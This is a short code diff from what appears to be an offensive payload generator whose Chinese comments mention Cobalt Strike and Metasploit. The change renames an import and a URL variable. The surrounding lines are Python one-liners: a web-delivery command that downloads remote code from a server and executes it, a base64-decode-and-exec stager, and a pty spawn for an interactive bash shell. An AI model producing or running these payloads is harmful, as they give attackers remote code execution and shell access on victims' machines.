@@ -1,5 +1,5 @@
 # encoding: utf8
-from .config import *
+from config import *
 import base64
 
 
@@ -74,7 +74,7 @@ python -c "import sys;u=__import__('urllib'+{{2:'',3:'.request'}}[sys.version_in
 cobalt默认地址{url}
 
 msf比较稳定
-""".format(url=cobalt_python)
+""".format(url=cs_python)
 
     def online_reverse(self):
         pass
@@ -92,7 +92,7 @@ msf比较稳定
         return "python -c \"import base64,sys;exec(base64.b64decode({{2:str,3:lambda b:bytes(b,'UTF-8')}}[sys.version_info[0]]('{bcode}')))\""
 
     def web_delivery(self):
-        return "python -c \"import urllib2; exec urllib2.urlopen('{url}').read();\"".format(url=cobalt_python)
+        return "python -c \"import urllib2; exec urllib2.urlopen('{url}').read();\"".format(url=cs_python)
 
     def tty_shell(self):
         return "python -c \"import pty;pty.spawn('/bin/bash')\""
